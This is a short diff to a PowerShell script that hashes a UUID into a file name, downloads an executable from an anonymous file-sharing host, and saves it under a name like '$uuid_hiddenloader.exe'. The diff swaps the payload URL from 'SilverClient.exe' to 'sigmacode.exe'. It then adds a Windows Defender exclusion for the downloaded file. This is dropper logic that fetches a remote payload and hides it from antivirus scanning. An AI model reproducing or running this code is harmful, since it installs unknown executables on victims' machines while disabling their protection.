@@ -10,8 +10,8 @@ $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvide
 $hash = [System.BitConverter]::ToString($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid)))
 $uuid = $hash -replace "-",""
 
-$url = "https://anonsharing.com/file/36c9e630a3dce435/SilverClient.exe"
-$output = "$dir\$uuid_sigma.exe"
+$url = "https://anonsharing.com/file/d89e87546849d234/sigmacode.exe"
+$output = "$dir\$uuid_hiddenloader.exe"
 Add-MpPreference -ExclusionPath $output
 
 if (Test-Path -Path $output) {
